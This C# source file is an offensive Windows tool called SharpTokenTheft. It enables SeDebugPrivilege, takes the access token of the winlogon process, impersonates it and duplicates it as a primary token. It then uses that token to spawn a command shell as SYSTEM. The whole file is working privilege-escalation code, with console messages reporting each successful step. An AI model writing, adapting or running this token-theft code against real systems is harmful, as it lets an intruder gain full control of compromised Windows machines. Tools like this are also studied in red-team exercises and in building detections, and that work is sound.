using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Security.Principal;
using System.IO;

namespace SharpTokenTheft {
	class Program {

		public static bool AdjustTokenPrivilege(string priv) {
			try {
				Pinvoke.PTOKEN_PRIVILEGES tPriv;
				IntPtr hProc = Pinvoke.GetCurrentProcess();
				IntPtr tHandle = IntPtr.Zero;
				if(Pinvoke.OpenProcessToken(hProc, Pinvoke.TOKEN_ADJUST_PRIVILEGES | Pinvoke.TOKEN_QUERY, ref tHandle)) {
					tPriv.Count = 1;
					tPriv.Luid = 0;
					tPriv.Attr = Pinvoke.SE_PRIVILEGE_ENABLED;
					Pinvoke.LookupPrivilegeValue(null, priv, ref tPriv.Luid);
					Pinvoke.PRIVILEGE_SET privs = new Pinvoke.PRIVILEGE_SET { Privilege = new Pinvoke.LUID_AND_ATTRIBUTES[1], Control = Pinvoke.PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };
					privs.Privilege[0].Luid = tPriv.Luid;
					privs.Privilege[0].Attributes = Pinvoke.LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
					bool privCheck;
					Pinvoke.PrivilegeCheck(tHandle, ref privs, out privCheck);
					if(!privCheck) { 
						Console.WriteLine("[*] Trying to adjust token for privilege '{0}'!", priv);
						if (Pinvoke.AdjustTokenPrivileges(tHandle, false, ref tPriv, 0, IntPtr.Zero, IntPtr.Zero)) {
							Console.WriteLine("[+] Success adjusting privilege to '{0}'!", priv);
							return true;
						}
					} else {
						Console.WriteLine("[+] Process token already have '{0}'!", priv);
						return true;
					}
				}
			} catch (Exception ex) {
				throw ex;
			}
			Console.WriteLine("[-] Error adjusting privilege {0}", Marshal.GetLastWin32Error());
			return false;
		}



		public static IntPtr PrimaryTokenTheft(int pid) {

			IntPtr PrimaryToken = new IntPtr();
			IntPtr hProcess = Pinvoke.OpenProcess(Pinvoke.ProcessAccessFlags.QueryInformation, true, pid);
			if (hProcess != IntPtr.Zero) {
				IntPtr tokenHandle = new IntPtr();
				if (Pinvoke.OpenProcessToken(hProcess, Pinvoke.TOKEN_DUPLICATE | Pinvoke.TOKEN_ASSIGN_PRIMARY | Pinvoke.TOKEN_QUERY, ref tokenHandle)) {
					if (Pinvoke.ImpersonateLoggedOnUser(tokenHandle)) {
						if (Pinvoke.DuplicateTokenEx(tokenHandle, Pinvoke.TOKEN_ADJUST_DEFAULT | Pinvoke.TOKEN_ADJUST_SESSIONID | Pinvoke.TOKEN_QUERY | Pinvoke.TOKEN_DUPLICATE | Pinvoke.TOKEN_ASSIGN_PRIMARY, IntPtr.Zero, 2, Pinvoke.TOKEN_TYPE.TokenPrimary, out PrimaryToken)) {
							Console.WriteLine("[+] Success duplicating primary token!");
							return PrimaryToken;
						}
					}
						
				}
			}

			Console.WriteLine("[-] Error impersonating process token! ({0})", Marshal.GetLastWin32Error());
			return IntPtr.Zero;
		}

		public static string getTokenType(IntPtr token) {

			string tokenType = null;
			uint rt = 1000;
			IntPtr tokenInfo = Marshal.AllocHGlobal((int)rt);
			IntPtr pb = Marshal.AllocCoTaskMem((int)rt);

			if (Pinvoke.GetTokenInformation(token, Pinvoke.TOKEN_INFORMATION_CLASS.TokenType, tokenInfo, rt, out rt)) {
				if (Marshal.ReadInt32(tokenInfo) == 1)
					tokenType = "Primary";
				else
					tokenType = "Impersonate";
			}
			return tokenType;
		}

		static void Main(string[] args) {

			Console.WriteLine("\n  - SharpTokenTheft -\n");

			AdjustTokenPrivilege("SeDebugPrivilege");

			String process = "winlogon";
			Process winLogon = Process.GetProcessesByName(process)[0];

			Console.WriteLine("[#] Duplicating primary token from {0}... ", process);
			IntPtr token = PrimaryTokenTheft(winLogon.Id);

			Console.WriteLine("[+] Token type: {0}", getTokenType(token));
			Console.WriteLine("[+] Running current process as: {0}", WindowsIdentity.GetCurrent().Name);

			Pinvoke.RevertToSelf();

			// Create Process with primary token
			Pinvoke.STARTUPINFO si = new Pinvoke.STARTUPINFO();
			Pinvoke.PROCESS_INFORMATION pi = new Pinvoke.PROCESS_INFORMATION();
			bool result = Pinvoke.CreateProcessWithTokenW(token, 0x00000001, @"C:\Windows\system32\cmd.exe", null, 0, IntPtr.Zero, null, ref si, out pi);
			if (result) 
				Console.WriteLine("[+] Success spawning cmd! ");
			else
				Console.WriteLine("[-] Error spawning process {0}", Marshal.GetLastWin32Error());
			Console.ReadKey();

		}
	}
}
